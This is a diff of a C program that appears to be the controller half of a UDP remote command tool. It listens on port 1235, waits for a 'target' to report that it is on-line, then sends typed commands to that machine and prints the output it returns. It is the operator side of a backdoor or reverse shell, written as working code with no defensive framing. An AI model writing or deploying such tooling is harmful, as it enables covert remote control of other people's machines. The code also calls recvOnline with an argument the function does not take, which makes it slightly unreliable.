@@ -10,31 +10,67 @@
 
 #define PORT 1235
 #define LENGTH  512
+struct sockaddr_in control_add;
+struct sockaddr_in remote_add;
+int sockfd;
+int length = LENGTH;
+char datagram[LENGTH];
 
-int main(int argc, char **argv){
-    int x, z, sockfd;
-    char *remote_ip = "127.0.0.1";
-    char datagram[LENGTH];
-    int length = LENGTH;
+int recvOnline() {
+    int x, z;
 
-    struct sockaddr_in control_add;
-    struct sockaddr_in remote_add;
+    puts("Waiting for connection...");
+    while(1) {
+        bzero(datagram, LENGTH);
+        z = recvfrom(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&remote_add, &length);
+        if (z == -1) {
+            printf("ERR_recvfrom: %s\n", strerror(errno));
+            exit(-1);
+        }
+        else if (strcmp(datagram, "ok") == 0) {
+            puts("Target is on-line.");
+            x = sendto(sockfd, "ok", 2, 0, (struct sockaddr *)&remote_add, sizeof(remote_add));
+            if (x == -1) {
+                printf("ERR_sendto: %s\n", strerror(errno));
+                exit(-1);
+            }
+            break;
+        }
+    }
+    return 0;
+}
+
+int main(int argc, char const *argv[]){
+    int x, z;
 
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    bzero(&remote_add, sizeof(remote_add));
-    remote_add.sin_family = AF_INET;
-    remote_add.sin_port = htons(PORT);
-    remote_add.sin_addr.s_addr = inet_addr(remote_ip);
+    bzero(&control_add, sizeof(control_add));
+    control_add.sin_family = AF_INET;
+    control_add.sin_port = htons(PORT);
+    control_add.sin_addr.s_addr = htonl(INADDR_ANY);
 
+    z = bind(sockfd, (struct sockaddr *)&control_add, sizeof(control_add));
+    if (z == -1) {
+        printf("ERR_bind: %s\n", strerror(errno));
+        exit(-1);
+    }
+
+    // Waiting for the target to send on-line information
+    recvOnline(sockfd);
     while(1) {
         printf("Command: ");
-        bzero(datagram, 512);
-        fgets(datagram, 512, stdin);
+        bzero(datagram, LENGTH);
+        fgets(datagram, LENGTH, stdin);
 
         if (strcmp(datagram, "\n") == 0) {
             continue;
         }
         else if (strcmp(datagram, "quit\n") == 0) {
+            x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&remote_add, sizeof(remote_add));
+            if (x == -1) {
+                printf("ERR_sendto: %s\n", strerror(errno));
+                exit(-1);
+            }
             break;
         }
 
@@ -42,16 +78,20 @@ int main(int argc, char **argv){
         x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&remote_add, sizeof(remote_add));
         if(x != -1){
             puts("Command sent. Waiting for response...");
-        }else
+        }else {
             printf("ERR_sendto: %s\n", strerror(errno));
-        bzero(datagram, 512);
+            exit(-1);
+        }
+        bzero(datagram, LENGTH);
 
         // Here the output of the command is collected from the remote machine
         do {
             bzero(datagram, sizeof(datagram));
-            z = recvfrom(sockfd, datagram, 512, 0, (struct sockaddr *)&control_add, &length);
-            if (z == -1)
+            z = recvfrom(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&remote_add, &length);
+            if (z == -1) {
                 printf("ERR_recvfrom: %s\n", strerror(errno));
+                exit(-1);
+            }
 
             datagram[z] = 0;
             printf("%s", datagram);
